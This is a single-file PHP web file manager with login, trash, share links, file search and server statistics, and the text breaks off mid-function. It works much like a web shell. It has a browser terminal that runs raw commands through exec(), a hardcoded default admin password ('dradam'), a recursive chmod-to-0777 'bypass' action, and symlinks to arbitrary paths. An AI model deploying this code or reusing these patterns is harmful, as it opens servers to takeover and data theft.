<?php
error_reporting(0);
ini_set('display_errors', 0);

$scriptName = basename(__FILE__);
$usersFile  = __DIR__ . '/.users.json';

function fm_load_users($f){
    if(!file_exists($f)){$s=[['user'=>'admin','hash'=>password_hash('dradam',PASSWORD_DEFAULT),'root'=>'','readonly'=>false,'admin'=>true]];@file_put_contents($f,json_encode($s,JSON_PRETTY_PRINT));return $s;}
    $d=@json_decode(@file_get_contents($f),true);return is_array($d)?$d:[];
}
function fm_save_users($f,$u){@file_put_contents($f,json_encode(array_values($u),JSON_PRETTY_PRINT));}
function fm_find_user($u,$n){foreach($u as $x){if($x['user']===$n)return $x;}return null;}

if(session_status()===PHP_SESSION_NONE) session_start();
if(empty($_SESSION['login_csrf'])) $_SESSION['login_csrf']=bin2hex(random_bytes(32));

/* ── Public share-link download (no auth required) ── */
if(isset($_GET['share'])){
    $shareToken=trim($_GET['share']);
    $sharesFile=__DIR__.'/.shares.json';
    $shares=file_exists($sharesFile)?(@json_decode(@file_get_contents($sharesFile),true)?:[]):[];
    $match=null;
    foreach($shares as $s){if(isset($s['token'])&&hash_equals($s['token'],$shareToken)){$match=$s;break;}}
    if($match&&(empty($match['expires'])||$match['expires']>time())&&is_file($match['path'])){
        $fp=$match['path'];
        $mime=function_exists('mime_content_type')?@mime_content_type($fp):'application/octet-stream';
        if(!$mime)$mime='application/octet-stream';
        header('Content-Type: '.$mime);header('Content-Length: '.filesize($fp));
        header('Content-Disposition: attachment; filename="'.basename($fp).'"');
        readfile($fp);exit;
    }
    http_response_code(410);header('Content-Type: text/plain;charset=utf-8');echo 'This share link is invalid or has expired.';exit;
}

$IDLE_TIMEOUT=900; $idleExpired=false;
if(isset($_SESSION['auth'])&&$_SESSION['auth']===true){
    if(isset($_SESSION['last_activity'])&&(time()-$_SESSION['last_activity'])>$IDLE_TIMEOUT){
        $_SESSION=[];session_destroy();session_start();$_SESSION['login_csrf']=bin2hex(random_bytes(32));$idleExpired=true;
    } else { $_SESSION['last_activity']=time(); }
}
if(isset($_GET['idle'])) $idleExpired=true;

if(isset($_POST['login_pass'])){
    $ok=isset($_POST['login_csrf'])&&hash_equals($_SESSION['login_csrf'],$_POST['login_csrf']);
    $users=fm_load_users($usersFile);
    $uname=isset($_POST['login_user'])?trim($_POST['login_user']):'';
    $u=fm_find_user($users,$uname);
    if($ok&&$u&&password_verify($_POST['login_pass'],$u['hash'])){
        $_SESSION['auth']=true;$_SESSION['fm_user']=$u['user'];$_SESSION['fm_root']=!empty($u['root'])?$u['root']:'';
        $_SESSION['fm_readonly']=!empty($u['readonly']);$_SESSION['fm_admin']=!empty($u['admin']);
        $_SESSION['csrf_token']=bin2hex(random_bytes(32));unset($_SESSION['login_csrf']);
        header("Location: ".$scriptName);exit;
    } else {
        $_SESSION['login_csrf']=bin2hex(random_bytes(32));
        $loginError=$ok?"Incorrect username or password.":"Security error. Please try again.";
    }
}

if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true){ ?>
<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign In — File Manager</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',sans-serif;background:#09090b;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background-image:radial-gradient(ellipse 80% 60% at 30% 0%,rgba(99,102,241,.15),transparent),radial-gradient(ellipse 60% 50% at 80% 100%,rgba(16,185,129,.07),transparent)}
.card{width:100%;max-width:400px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.09);border-radius:24px;padding:44px 40px;backdrop-filter:blur(20px);box-shadow:0 32px 80px rgba(0,0,0,.7),inset 0 1px 0 rgba(255,255,255,.08);animation:up .5s cubic-bezier(.34,1.56,.64,1) both}
@keyframes up{from{opacity:0;transform:translateY(32px) scale(.96)}to{opacity:1;transform:none}}
.logo{width:64px;height:64px;margin:0 auto 24px;background:linear-gradient(135deg,rgba(99,102,241,.2),rgba(99,102,241,.05));border:1px solid rgba(99,102,241,.3);border-radius:18px;display:flex;align-items:center;justify-content:center}
.logo svg{width:32px;height:32px;stroke:#818cf8;fill:none;stroke-width:1.6;stroke-linecap:round;stroke-linejoin:round}
h1{text-align:center;font-size:22px;font-weight:700;color:#f4f4f5;margin-bottom:6px;letter-spacing:-.4px}
.sub{text-align:center;font-size:13px;color:#52525b;margin-bottom:32px}
.field{margin-bottom:16px}
label{display:block;font-size:11px;font-weight:700;color:#71717a;text-transform:uppercase;letter-spacing:.8px;margin-bottom:8px}
.iw{position:relative}
.iw svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:16px;height:16px;stroke:#52525b;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;pointer-events:none}
.iw input{width:100%;padding:13px 14px 13px 42px;background:rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.1);border-radius:12px;color:#f4f4f5;font-size:15px;outline:none;font-family:'Inter',sans-serif;transition:border-color .2s,box-shadow .2s}
.iw input:focus{border-color:rgba(99,102,241,.7);box-shadow:0 0 0 4px rgba(99,102,241,.12)}
.iw input::placeholder{color:#3f3f46;letter-spacing:0}
.btn{width:100%;margin-top:8px;padding:14px;background:linear-gradient(135deg,#6366f1,#4f46e5);border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:600;font-family:'Inter',sans-serif;cursor:pointer;box-shadow:0 4px 24px rgba(99,102,241,.4);transition:transform .18s cubic-bezier(.34,1.56,.64,1),box-shadow .18s}
.btn:hover{transform:translateY(-2px);box-shadow:0 10px 36px rgba(99,102,241,.55)}.btn:active{transform:scale(.97)}
.err{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);border-radius:10px;color:#fca5a5;font-size:13px;margin-bottom:18px;animation:shake .4s both}
@keyframes shake{0%,100%{transform:none}20%,60%{transform:translateX(-4px)}40%,80%{transform:translateX(4px)}}
.err svg{width:16px;height:16px;stroke:#ef4444;fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
</style></head><body>
<div class="card">
  <div class="logo"><svg viewBox="0 0 24 24"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(129,140,248,.15)"/></svg></div>
  <h1>File Manager</h1><p class="sub">Sign in to continue</p>
  <?php if(isset($loginError)):?><div class="err"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><?=htmlspecialchars($loginError)?></div><?php elseif(!empty($idleExpired)):?><div class="err" style="background:rgba(245,158,11,.08);border-color:rgba(245,158,11,.2);color:#fcd34d"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Session expired due to inactivity.</div><?php endif;?>
  <form method="post">
    <input type="hidden" name="login_csrf" value="<?=htmlspecialchars($_SESSION['login_csrf'])?>">
    <div class="field"><label for="un">Username</label><div class="iw"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 21v-1a8 8 0 0 1 16 0v1"/></svg><input type="text" id="un" name="login_user" placeholder="Enter username" required autofocus></div></div>
    <div class="field"><label for="pw">Password</label><div class="iw"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><input type="password" id="pw" name="login_pass" placeholder="Enter password" required style="letter-spacing:.1em"></div></div>
    <button type="submit" class="btn">Sign In</button>
  </form>
</div></body></html>
<?php exit; }

/* ═══ CLASS ═══ */
class FileManager {
    private $currentDir,$messages=[],$favFile,$root,$readonly,$trashDir,$trashMeta,$logFile,$shareFile;
    public function __construct(){
        $this->root=!empty($_SESSION['fm_root'])?realpath($_SESSION['fm_root']):null;
        $this->readonly=!empty($_SESSION['fm_readonly']);
        $base=$this->root?:__DIR__;
        $this->currentDir=isset($_GET['dir'])&&$_GET['dir']?realpath($_GET['dir']):$base;
        if($this->currentDir===false||!file_exists($this->currentDir)){$this->currentDir=$base;$this->addMsg('Directory not found.','warning');}
        if($this->root&&strpos($this->currentDir.DIRECTORY_SEPARATOR,rtrim($this->root,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR)!==0&&$this->currentDir!==$this->root){$this->currentDir=$this->root;$this->addMsg('Access restricted.','warning');}
        $this->favFile=__DIR__.'/.favorites.json';
        $this->trashDir=__DIR__.'/.trash';$this->trashMeta=__DIR__.'/.trash.json';$this->logFile=__DIR__.'/.activity.json';$this->shareFile=__DIR__.'/.shares.json';
        if(!is_dir($this->trashDir))@mkdir($this->trashDir,0755,true);
    }
    public function isRO(){return $this->readonly;}
    public function getRoot(){return $this->root;}
    public function getCwd(){return $this->currentDir;}
    public function getMsgs(){return $this->messages;}
    public function addMsg($m,$t){$this->messages[]=['text'=>$m,'type'=>$t];}
    public function getSysRoot(){return strtoupper(substr(PHP_OS,0,3))==='WIN'?getenv('SystemDrive')."\\":"/"; }
    public function getSelf(){return basename(__FILE__);}

    /* Activity */
    public function log($action,$detail=''){
        $e=['time'=>time(),'user'=>$_SESSION['fm_user']??'','action'=>$action,'detail'=>$detail,'dir'=>$this->currentDir];
        $log=$this->getLogs();array_unshift($log,$e);if(count($log)>1000)$log=array_slice($log,0,1000);
        @file_put_contents($this->logFile,json_encode($log,JSON_PRETTY_PRINT));
    }
    public function getLogs(){if(!file_exists($this->logFile))return[];$d=@json_decode(@file_get_contents($this->logFile),true);return is_array($d)?$d:[];}
    public function clearLog(){@file_put_contents($this->logFile,json_encode([]));$this->addMsg('Activity log cleared.','warning');}

    /* Favorites */
    public function getFavs(){if(!file_exists($this->favFile))return[];$d=@json_decode(@file_get_contents($this->favFile),true);return is_array($d)?$d:[];}
    private function saveFavs($f){@file_put_contents($this->favFile,json_encode(array_values(array_unique($f))));}
    public function isFav($p){return in_array($p,$this->getFavs());}
    private function addFav($p){if(!$p||!is_dir($p))return;$f=$this->getFavs();if(!in_array($p,$f)){$f[]=$p;$this->saveFavs($f);}$this->addMsg('Added to favorites.','success');}
    private function removeFav($p){$this->saveFavs(array_values(array_diff($this->getFavs(),[$p])));$this->addMsg('Removed from favorites.','warning');}

    /* Trash */
    private function loadTrash(){if(!file_exists($this->trashMeta))return[];$d=@json_decode(@file_get_contents($this->trashMeta),true);return is_array($d)?$d:[];}
    private function saveTrash($t){@file_put_contents($this->trashMeta,json_encode(array_values($t),JSON_PRETTY_PRINT));}
    public function getTrash(){$t=$this->loadTrash();usort($t,fn($a,$b)=>$b['trashed_at']<=>$a['trashed_at']);return $t;}
    private function moveToTrash($p,$od){
        if(!file_exists($p))return false;
        $n=basename($p);$id=uniqid('t',true);$tn=$id.'__'.$n;$tp=$this->trashDir.'/'.$tn;
        if(@rename($p,$tp)){$t=$this->loadTrash();$t[]=['id'=>$id,'trash_name'=>$tn,'original_name'=>$n,'original_dir'=>$od,'type'=>is_dir($tp)?'dir':'file','trashed_at'=>time(),'trashed_by'=>$_SESSION['fm_user']??''];$this->saveTrash($t);return true;}
        return false;
    }
    private function restoreTrash($id){
        $t=$this->loadTrash();
        foreach($t as $i=>$e){if($e['id']===$id){
            $tp=$this->trashDir.'/'.$e['trash_name'];
            if(!file_exists($tp)){$this->addMsg('Item not found.','danger');array_splice($t,$i,1);$this->saveTrash($t);return;}
            if(!is_dir($e['original_dir'])){$this->addMsg('Original folder gone.','danger');return;}
            $dst=rtrim($e['original_dir'],'/').'/'.$e['original_name'];
            if(file_exists($dst))$dst=rtrim($e['original_dir'],'/').'/restored_'.time().'_'.$e['original_name'];
            if(@rename($tp,$dst)){array_splice($t,$i,1);$this->saveTrash($t);$this->log('restore',$e['original_name']);$this->addMsg('Restored "'.$e['original_name'].'".','success');}
            else $this->addMsg('Restore failed.','danger');return;
        }}
        $this->addMsg('Not found.','danger');
    }
    private function permDelTrash($id){
        $t=$this->loadTrash();
        foreach($t as $i=>$e){if($e['id']===$id){$this->rmdirR($this->trashDir.'/'.$e['trash_name']);array_splice($t,$i,1);$this->saveTrash($t);$this->addMsg('Permanently deleted.','warning');return;}}
    }
    private function emptyTrash(){$t=$this->loadTrash();foreach($t as $e)$this->rmdirR($this->trashDir.'/'.$e['trash_name']);$this->saveTrash([]);$this->addMsg('Trash emptied.','warning');}

    /* Content search */
    public function contentSearch($q,$deep=false){
        $res=[];$q=trim($q);if($q==='')return $res;
        $types=['text','code','data','config'];$max=200;$maxSz=2*1024*1024;$cnt=0;
        $sd=$deep?($this->root?:__DIR__):$this->currentDir;
        try{$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sd,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::LEAVES_ONLY);}catch(Exception $e){return $res;}
        foreach($it as $item){
            if($cnt>=$max)break;if(!$item->isFile())continue;$p=$item->getPathname();
            if($p===__FILE__)continue;if(strpos($p,$this->trashDir)===0)continue;
            if($item->getSize()>$maxSz)continue;
            if(!in_array($this->getType($item->getFilename()),$types))continue;
            $c=@file_get_contents($p);if($c===false)continue;
            $pos=stripos($c,$q);if($pos!==false){
                $sn=trim(preg_replace('/\s+/',' ',substr($c,max(0,$pos-40),140)));
                $res[]=['path'=>$p,'name'=>$item->getFilename(),'dir'=>dirname($p),'snippet'=>$sn];$cnt++;
            }
        }
        return $res;
    }

    /* Disk */
    public function diskTotal(){$t=@disk_total_space($this->currentDir);return $t===false?0:$t;}
    public function diskFree(){$f=@disk_free_space($this->currentDir);return $f===false?0:$f;}

    /* Live server stats (status bar + server info) */
    public function sysStats(){
        $load=function_exists('sys_getloadavg')?@sys_getloadavg():false;
        $memTotal=0;$memUsed=0;$memPct=0;
        if(is_file('/proc/meminfo')){
            $mi=@file_get_contents('/proc/meminfo');
            if($mi&&preg_match('/MemTotal:\s+(\d+)/',$mi,$mt)&&preg_match('/MemAvailable:\s+(\d+)/',$mi,$ma)){
                $memTotal=((int)$mt[1])*1024;$avail=((int)$ma[1])*1024;$memUsed=max(0,$memTotal-$avail);
                $memPct=$memTotal>0?round($memUsed/$memTotal*100):0;
            }
        }
        $uptime=0;
        if(is_file('/proc/uptime')){$u=@file_get_contents('/proc/uptime');if($u!==false)$uptime=(int)floatval(explode(' ',trim($u))[0]);}
        $dt=$this->diskTotal();$df=$this->diskFree();$du=max(0,$dt-$df);
        $cores=0;$model='';
        if(is_file('/proc/cpuinfo')){
            $ci=@file_get_contents('/proc/cpuinfo');
            if($ci){$cores=substr_count($ci,'processor');if(preg_match('/model name\s*:\s*(.+)/',$ci,$mm))$model=trim($mm[1]);}
        }
        if(!$cores&&function_exists('shell_exec')){$n=(int)trim((string)@shell_exec('nproc'));if($n>0)$cores=$n;}
        return [
            'load'=>$load?array_map(fn($v)=>round($v,2),$load):null,
            'mem_total'=>$memTotal,'mem_used'=>$memUsed,'mem_pct'=>$memPct,
            'uptime'=>$uptime,
            'cpu_cores'=>$cores?:null,'cpu_model'=>$model,
            'hostname'=>function_exists('gethostname')?gethostname():(function_exists('php_uname')?php_uname('n'):''),
            'server_ip'=>isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'',
            'client_ip'=>isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'',
            'disk_total'=>$dt,'disk_free'=>$df,'disk_used'=>$du,'disk_pct'=>$dt>0?round($du/$dt*100):0,
        ];
    }

    /* PHP error log */
    public function errLogPath(){$p=@ini_get('error_log');return $p?:'';}
    public function getErrLog($n=300){
        $p=$this->errLogPath();
        if(!$p||!is_file($p)||!is_readable($p))return['path'=>$p,'lines'=>[],'size'=>0];
        $sz=filesize($p);$max=2*1024*1024;
        $fh=@fopen($p,'r');if(!$fh)return['path'=>$p,'lines'=>[],'size'=>$sz];
        $seek=$sz>$max?$sz-$max:0;fseek($fh,$seek);
        $data=fread($fh,$sz-$seek);fclose($fh);
        $lines=preg_split('/\r\n|\n|\r/',trim($data));
        if($lines===[''])$lines=[];
        $lines=array_slice($lines,-$n);
        return['path'=>$p,'lines'=>$lines,'size'=>$sz];
    }
    private function clearErrLog(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $p=$this->errLogPath();
        if(!$p||!is_file($p)){$this->addMsg('No error log configured.','warning');return;}
        if(@file_put_contents($p,'')!==false){$this->log('clear_errlog','');$this->addMsg('Error log cleared.','warning');}
        else $this->addMsg('Cannot clear log (permission denied).','danger');
    }

    /* Environment variables (secrets redacted) */
    public function getEnvSafe(){
        $e=array_merge(is_array($_ENV)?$_ENV:[],getenv()?:[]);
        $out=[];
        foreach($e as $k=>$v){
            if(is_array($v))$v=json_encode($v);
            $v=(string)$v;
            if(preg_match('/SECRET|PASS|PWD|TOKEN|KEY|CREDENTIAL|AUTH|DATABASE|DSN|URL|URI|CONN|COOKIE/i',$k)){$v='••••••••';}
            elseif(preg_match('#://[^/\s]*:[^/\s@]*@#',$v)){$v='••••••••';} // redact any embedded user:pass@ connection string regardless of key name
            $out[$k]=$v;
        }
        ksort($out);return $out;
    }

    /* Large-file scanner (recursive, time-capped) */
    public function findLargeFiles($minBytes){
        $sd=$this->currentDir;$res=[];$start=microtime(true);$cap=8;$capped=false;$cnt=0;
        try{$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sd,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::LEAVES_ONLY);}
        catch(Exception $e){return['files'=>[],'capped'=>false];}
        foreach($it as $item){
            if(microtime(true)-$start>$cap){$capped=true;break;}
            if(!$item->isFile())continue;
            $p=$item->getPathname();if(strpos($p,$this->trashDir)===0)continue;if($p===__FILE__)continue;
            $sz=$item->getSize();if($sz<$minBytes)continue;
            $res[]=['path'=>$p,'name'=>$item->getFilename(),'dir'=>dirname($p),'size'=>$sz];
            $cnt++;if($cnt>=500){$capped=true;break;}
        }
        usort($res,fn($a,$b)=>$b['size']<=>$a['size']);
        return['files'=>$res,'capped'=>$capped];
    }

    /* Duplicate-file finder (size, then md5, time-capped) */
    public function findDuplicates(){
        $sd=$this->currentDir;$bySize=[];$start=microtime(true);$cap=8;$capped=false;$cnt=0;
        try{$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sd,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::LEAVES_ONLY);}
        catch(Exception $e){return['groups'=>[],'capped'=>false];}
        foreach($it as $item){
            if(microtime(true)-$start>$cap){$capped=true;break;}
            if(!$item->isFile())continue;
            $p=$item->getPathname();if(strpos($p,$this->trashDir)===0)continue;if($p===__FILE__)continue;
            $sz=$item->getSize();if($sz===0)continue;
            $bySize[$sz][]=$p;$cnt++;if($cnt>=5000){$capped=true;break;}
        }
        $groups=[];
        foreach($bySize as $sz=>$paths){
            if(count($paths)<2)continue;
            if(microtime(true)-$start>$cap){$capped=true;break;}
            $byHash=[];
            foreach($paths as $p){$h=@md5_file($p);if($h===false)continue;$byHash[$h][]=$p;}
            foreach($byHash as $h=>$fps){
                if(count($fps)<2)continue;
                $groups[]=['hash'=>$h,'size'=>$sz,'files'=>array_map(fn($p)=>['path'=>$p,'name'=>basename($p),'dir'=>dirname($p)],$fps)];
            }
        }
        usort($groups,fn($a,$b)=>$b['size']<=>$a['size']);
        return['groups'=>$groups,'capped'=>$capped];
    }

    /* One-click backup of current folder as .zip */
    private function backupDir(){
        if(!class_exists('ZipArchive')){$this->addMsg('ZIP extension not available.','danger');return;}
        $bdir=__DIR__.'/.backups';if(!is_dir($bdir))@mkdir($bdir,0755,true);
        $name='backup_'.preg_replace('/[^A-Za-z0-9_-]/','_',basename($this->currentDir)).'_'.date('Ymd_His').'.zip';
        $zp=$bdir.'/'.$name;
        $z=new ZipArchive();if($z->open($zp,ZipArchive::CREATE)!==true){$this->addMsg('Could not create backup archive.','danger');return;}
        $this->zadd($z,$this->currentDir,basename($this->currentDir));
        $z->close();
        $this->log('backup_dir',$name);
        $this->addMsg('Backup created: .backups/'.$name,'success');
    }

    /* Delete an absolute path, restricted to inside the current directory tree (used by the large-file / duplicate tools) */
    private function deleteAbs(){
        if($this->readonly){$this->addMsg('Read-only account.','danger');return;}
        $p=isset($_POST['abs_path'])?$_POST['abs_path']:'';
        $rp=realpath($p);
        $base=rtrim($this->currentDir,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
        if(!$rp||$rp===__FILE__||strpos($rp.DIRECTORY_SEPARATOR,$base)!==0){$this->addMsg('Invalid or out-of-scope path.','danger');return;}
        $n=basename($rp);
        if($this->rmdirR($rp)){$this->log('delete_abs',$n);$this->addMsg('Deleted "'.$n.'".','warning');}
        else $this->addMsg('Delete failed.','danger');
    }

    /* Checksum */
    public function checksum($fn){
        $p=realpath($this->currentDir.'/'.$fn);
        if(!$p||!is_file($p)||$p===__FILE__)return null;
        return['md5'=>md5_file($p),'sha1'=>sha1_file($p),'sha256'=>hash_file('sha256',$p),'size'=>filesize($p),'name'=>$fn];
    }

    /* Terminal */
    public function runCmd($cmd){
        if(empty(trim($cmd)))return['output'=>'','exit'=>0,'ms'=>0];
        $t=microtime(true);$out=[];$exit=0;
        $cwd=escapeshellarg($this->currentDir);
        exec("cd $cwd && $cmd 2>&1",$out,$exit);
        $this->log('terminal',$cmd);
        return['output'=>implode("\n",$out),'exit'=>$exit,'ms'=>round((microtime(true)-$t)*1000)];
    }

    /* Autocomplete */
    public function autocomplete($prefix){
        $items=@scandir($this->currentDir);if(!$items)return[];
        $res=[];$p=basename($prefix);
        foreach($items as $i){if($i==='.'||$i==='..')continue;if($p===''||stripos($i,$p)===0)$res[]=$i.(is_dir($this->currentDir.'/'.$i)?'/':'');}
        return array_slice($res,0,12);
    }

    /* Handle request */
    public function handle(){
        if($_SERVER['REQUEST_METHOD']!=='POST')return;
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){$this->addMsg('Security error.','danger');return;}
        $a=isset($_POST['action'])?$_POST['action']:'';
        $wA=['upload','create_folder','create_file','delete','rename','save_edit','bypass_perms','bulk_delete','bulk_copy','bulk_move','zip_create','zip_extract','restore_trash','trash_perm','trash_empty','duplicate','tar_create','tar_extract','clear_log','batch_rename','create_symlink','chmod_item','create_share','revoke_share','backup_dir','clear_errlog','delete_abs'];
        if($this->readonly&&in_array($a,$wA)){$this->addMsg('Read-only account.','danger');return;}
        switch($a){
            case 'upload':         $this->upload();break;
            case 'create_folder':  $this->mkDir();break;
            case 'create_file':    $this->mkFile();break;
            case 'delete':         $this->delItem();break;
            case 'rename':         $this->renItem();break;
            case 'save_edit':      $this->saveFile();break;
            case 'bypass_perms':   $this->bypassPerms();break;
            case 'go_to_path':     $this->goPath();break;
            case 'add_favorite':   $this->addFav(isset($_POST['path'])?$_POST['path']:'');break;
            case 'remove_favorite':$this->removeFav(isset($_POST['path'])?$_POST['path']:'');break;
            case 'bulk_delete':    $this->bulkDel();break;
            case 'bulk_copy':      $this->bulkCopyMove(false);break;
            case 'bulk_move':      $this->bulkCopyMove(true);break;
            case 'zip_create':     $this->zipCreate();break;
            case 'zip_extract':    $this->zipExtract();break;
            case 'restore_trash':  $this->restoreTrash(isset($_POST['trash_id'])?$_POST['trash_id']:'');break;
            case 'trash_perm':     $this->permDelTrash(isset($_POST['trash_id'])?$_POST['trash_id']:'');break;
            case 'trash_empty':    $this->emptyTrash();break;
            case 'duplicate':      $this->dupFile();break;
            case 'tar_create':     $this->tarCreate();break;
            case 'tar_extract':    $this->tarExtract();break;
            case 'clear_log':      $this->clearLog();break;
            case 'batch_rename':   $this->batchRename();break;
            case 'create_symlink': $this->mkSymlink();break;
            case 'chmod_item':     $this->chmodItem();break;
            case 'create_share':   $this->createShare();break;
            case 'revoke_share':   $this->revokeShare(isset($_POST['share_id'])?$_POST['share_id']:'');break;
            case 'backup_dir':     $this->backupDir();break;
            case 'clear_errlog':   $this->clearErrLog();break;
            case 'delete_abs':     $this->deleteAbs();break;
            case 'logout':         session_destroy();header("Location: ".basename(__FILE__));exit;
        }
    }

    private function goPath(){$p=isset($_POST['path'])?trim($_POST['path']):'';if($p&&is_dir($p)){header("Location: ?dir=".urlencode($p));exit;}$this->addMsg('Invalid path.','danger');}

    private function upload(){
        if(!isset($_FILES['file']))return;
        $names=$_FILES['file']['name'];
        if(is_array($names)){$ok=0;$fail=0;foreach($names as $i=>$n){if($_FILES['file']['error'][$i]!==0){$fail++;continue;}$n=basename($n);if(move_uploaded_file($_FILES['file']['tmp_name'][$i],$this->currentDir.'/'.$n))$ok++;else $fail++;}
            if($ok){$this->log('upload',"$ok file(s)");$this->addMsg("$ok file(s) uploaded.".($fail?" $fail failed.":''),'success');}else $this->addMsg('Upload failed.','danger');
        } else {if($_FILES['file']['error']!==0)return;$n=basename($names);if(move_uploaded_file($_FILES['file']['tmp_name'],$this->currentDir.'/'.$n)){$this->log('upload',$n);$this->addMsg("Uploaded: $n",'success');}else $this->addMsg('Upload failed.','danger');}
    }
    private function mkDir(){$n=basename(trim(isset($_POST['folder_name'])?$_POST['folder_name']:'')); if(!$n)return;$p=$this->currentDir.'/'.$n;if(!file_exists($p)&&@mkdir($p)){$this->log('mkdir',$n);$this->addMsg("Folder created: $n",'success');}else $this->addMsg('Could not create folder.','danger');}
    private function mkFile(){$n=basename(trim(isset($_POST['file_name'])?$_POST['file_name']:'')); if(!$n)return;$p=$this->currentDir.'/'.$n;if(file_exists($p)){$this->addMsg('File already exists.','danger');return;}if(@file_put_contents($p,'')!==false){$this->log('create',$n);$this->addMsg("Created: $n",'success');header("Location: ?edit=".urlencode($n)."&dir=".urlencode($this->currentDir));exit;}$this->addMsg('Failed to create file.','danger');}
    private function delItem(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n||$this->isSelf($n)){$this->addMsg('Access denied.','danger');return;}$p=$this->currentDir.'/'.$n;if($this->moveToTrash($p,$this->currentDir)){$this->log('trash',$n);$this->addMsg("Trashed: $n",'warning');}else $this->addMsg('Delete failed.','danger');}
    private function renItem(){$o=basename(isset($_POST['old_name'])?$_POST['old_name']:'');$nw=basename(isset($_POST['new_name'])?$_POST['new_name']:'');if(!$o||!$nw||$o===$nw)return;if($this->isSelf($o)){$this->addMsg('Access denied.','danger');return;}$po=$this->currentDir.'/'.$o;$pn=$this->currentDir.'/'.$nw;if(file_exists($po)&&!file_exists($pn)&&@rename($po,$pn)){$this->log('rename',"$o → $nw");$this->addMsg('Renamed.','success');}else $this->addMsg('Rename failed.','danger');}
    private function saveFile(){$n=basename(isset($_POST['filename'])?$_POST['filename']:'');if(!$n||$this->isSelf($n))return;$p=$this->currentDir.'/'.$n;if(!file_exists($p)||!is_file($p)){$this->addMsg('File not found.','danger');return;}$c=isset($_POST['content'])?$_POST['content']:'';if(file_put_contents($p,$c)!==false){$this->log('edit',$n);$this->addMsg("Saved: $n",'success');}else $this->addMsg('Save failed.','danger');}
    private function bypassPerms(){$cnt=0;$f=0;$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($this->currentDir,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($it as $item){$p=$item->getPathname();if($p===__FILE__)continue;if($item->isDir()){if(@chmod($p,0777))$cnt++;else $f++;}else{if(@chmod($p,0666))$cnt++;else $f++;}}$this->log('chmod',"$cnt changed");$this->addMsg("Permissions: $cnt changed".($f?", $f failed":""),$f?'warning':'success');}
    private function dupFile(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$src=$this->currentDir.'/'.$n;if(!is_file($src)){$this->addMsg('File not found.','danger');return;}$ext=pathinfo($n,PATHINFO_EXTENSION);$base=pathinfo($n,PATHINFO_FILENAME);$cp=$base.'_copy'.($ext?'.'.$ext:'');$i=1;while(file_exists($this->currentDir.'/'.$cp)){$cp=$base.'_copy'.$i.($ext?'.'.$ext:'');$i++;}if(@copy($src,$this->currentDir.'/'.$cp)){$this->log('duplicate',"$n → $cp");$this->addMsg("Duplicated: $cp",'success');}else $this->addMsg('Duplicate failed.','danger');}
    private function mkSymlink(){
        $target=trim(isset($_POST['sym_target'])?$_POST['sym_target']:'');
        $name=basename(trim(isset($_POST['sym_name'])?$_POST['sym_name']:''));
        if(!$target||!$name){$this->addMsg('Target and name required.','danger');return;}
        $lp=$this->currentDir.'/'.$name;
        if(file_exists($lp)){$this->addMsg('Name already in use.','danger');return;}
        if(@symlink($target,$lp)){$this->log('symlink',"$name → $target");$this->addMsg("Symlink created: $name",'success');}
        else $this->addMsg('Symlink failed.','danger');
    }
    /* Permissions */
    private function chmodItem(){
        $n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');
        $perm=isset($_POST['perm'])?trim($_POST['perm']):'';
        if(!$n||$this->isSelf($n)){$this->addMsg('Access denied.','danger');return;}
        if(!preg_match('/^[0-7]{3,4}$/',$perm)){$this->addMsg('Invalid permission value.','danger');return;}
        $p=$this->currentDir.'/'.$n;
        if(!file_exists($p)){$this->addMsg('Item not found.','danger');return;}
        if(@chmod($p,octdec($perm))){$this->log('chmod',"$n → $perm");$this->addMsg("Permissions updated: $n ($perm)",'success');}
        else $this->addMsg('chmod failed (insufficient permissions).','danger');
    }

    /* Folder size */
    public function dirSize($path){
        if(!is_dir($path))return['error'=>'Not a directory'];
        $size=0;$files=0;$dirs=0;$start=microtime(true);$capped=false;
        try{
